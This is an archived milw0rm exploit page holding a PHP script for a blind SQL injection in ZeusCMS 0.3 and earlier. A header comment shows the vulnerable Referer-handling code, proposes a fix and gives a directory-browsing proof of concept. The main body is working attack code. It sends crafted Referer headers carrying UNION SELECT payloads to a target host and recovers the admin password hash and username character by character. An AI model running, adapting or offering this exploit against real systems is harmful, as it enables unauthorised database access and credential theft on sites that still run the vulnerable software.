<html><head><title>ZeusCMS <= 0.3 Remote Blind SQL Injection Exploit</title></head><pre>&lt;?

/*
	-------------------------------------------------
	ZeusCMS &lt;= 0.3 Remote Blind SQL Injection Exploit
	------------------------------------------------- 
	
	author...: EgiX
	mail.....: n0b0d13s[at]gmail[dot]com
	
	link.....: http://www.zeuscms.gr/
	details..: works with magic_quotes_gpc = off (if magic quotes affects also $_SERVER array)

	[-] Blind SQL Injection in /index.php :

	129.	$blockedRefCheck=security::checkRef($_SERVER[&quot;HTTP_REFERER&quot;]); &lt;==
	130.	
	131.	if(@in_array($_SERVER['REMOTE_ADDR'],$blockedips) || $blockedRefCheck==TRUE){
	132.		include &quot;html_files/denied.html&quot;;
	133.	}
	134.	else

	[-] checkRef() function defined in /security.php :

	130.	function checkref($ref){
	131.	  if($ref){
	132.		$res=eregi_replace(&quot;http://&quot;,&quot;&quot;,$ref);
	133.		include &quot;dbase.php&quot;;
	134.		$table=$prefix.&quot;referers&quot;;
	135.		$res=$db-&gt;query(&quot;SELECT * FROM $table WHERE url like '%$ref%' AND status='BLOCKED'&quot;); &lt;==
	136.		if($res-&gt;numRows()&gt;0){
	137.			return true;
	138.		}
	139.		else{
	140.			return false;
	141.		}
	142.		}else{
	143.      return false;
	144.    }

	an attacker can inject sql code through http referer header, that isn't properly checked...

	[*] Possible bug fix in /index.php :

	128.	$ref = security::safeGet($_SERVER[&quot;HTTP_REFERER&quot;]);
	129.	$blockedRefCheck = security::checkRef($ref);

	[-] there is also a possible file system browsing through /image_viewer.php, p.o.c. :
	
	http://[host]/[path]/image_viewer.php?dir=/
*/

error_reporting(0);
ini_set(&quot;default_socket_timeout&quot;, 5);
set_time_limit(0);

function http_send($host, $packet)
{
	$sock = fsockopen($host, 80);
	while (!$sock)
	{
		print &quot;\n[-] No response from {$host}:80 Trying again...&quot;;
		$sock = fsockopen($host, 80);
		sleep(1);
	}
	fputs($sock, $packet);
	$resp = &quot;&quot;;
	while (!feof($sock)) $resp .= fread($sock, 1);
	fclose($sock);
	return $resp;
}

function check_query($sql)
{
	global $host, $path;
	
	$packet = &quot;GET {$path} HTTP/1.1\r\n&quot;;
	$packet.= &quot;Host: {$host}\r\n&quot;;
	$packet.= &quot;Referer: {$sql} \r\n&quot;;
	$packet.= &quot;Keep-Alive: 300\r\n&quot;;
	$packet.= &quot;Connection: keep-alive\r\n\r\n&quot;;
	$html	= http_send($host, $packet);
	
	return (preg_match(&quot;/DENIED/&quot;, $html) ? true : false);
}

print &quot;\n+-----------------------------------------------------------+&quot;;
print &quot;\n| ZeusCMS &lt;= 0.3 Remote Blind SQL Injection Exploit by EgiX |&quot;;
print &quot;\n+-----------------------------------------------------------+\n&quot;;

if ($argc &lt; 3)
{
	print &quot;\nUsage......:	php $argv[0] host path [prefix] [userid]\n&quot;;
	print &quot;\nhost.......:	target server (ip/hostname)&quot;;
	print &quot;\npath.......:	path to ZeusCMS directory (example: / or /zeuscms/)&quot;;
	print &quot;\nprefix.....:	table's prefix (default: ze)&quot;;
	print &quot;\nuserid.....:	user id (default: 1 - admin)\n&quot;;
	die();
}

$host = $argv[1];
$path = $argv[2];
$pre  = (isset($argv[3]) ? $argv[3] : &quot;ze&quot;);
$uid  = (isset($argv[4]) ? $argv[4] : &quot;1&quot;);

$hash = array(0,48,49,50,51,52,53,54,55,56,57,97,98,99,100,101,102);
$index = 1; $md5 = &quot;&quot;;
print &quot;\n[-] MD5 Hash: &quot;;

while (!strpos($md5, chr(0)))
{
	for ($i = 0; $i &lt;= count($hash); $i++)
	{
  		if ($i == count($hash)) die(&quot;\n[-] Exploit failed...\n&quot;);

		$sql =	&quot;%'/**/AND/**/id=-1/**/UNION/**/SELECT/**/pwd,1,1,1/**/FROM/**/{$pre}_users/**/&quot; .
			&quot;WHERE/**/id={$uid}/**/AND/**/ORD(SUBSTR(pwd,{$index},1))={$hash[$i]}/*&quot;;

		if (check_query($sql)) { $md5 .= chr($hash[$i]); print chr($hash[$i]); break; }
	}

	$index++;
}

$char = array(0); // null char
for ($j = 97; $j &lt;= 122; $j++) $char = array_merge($char, array($j)); // a-z
for ($j = 65; $j &lt;= 90; $j++) $char = array_merge($char, array($j)); // A-Z
for ($j = 48; $j &lt;= 57; $j++) $char = array_merge($char, array($j)); // 0-9

$index = 1; $user = &quot;&quot;;
print &quot;\n[-] Username: &quot;;

while (!strpos($user, chr(0)))
{
	for ($i = 0; $i &lt;= count($char); $i++)
	{
  		if ($i == count($char)) die(&quot;\n[-] Exploit failed...\n&quot;);

		$sql =	&quot;%'/**/AND/**/id=-1/**/UNION/**/SELECT/**/nickname,1,1,1/**/FROM/**/{$pre}_users/**/&quot; .
			&quot;WHERE/**/id={$uid}/**/AND/**/ORD(SUBSTR(nickname,{$index},1))={$char[$i]}/*&quot;;

		if (check_query($sql)) { $user .= chr($char[$i]); print chr($char[$i]); break; }
	}

	$index++;
}

print &quot;\n\n[-] Successfull!\n&quot;;

?&gt;

# milw0rm.com [2007-12-27]</pre></html>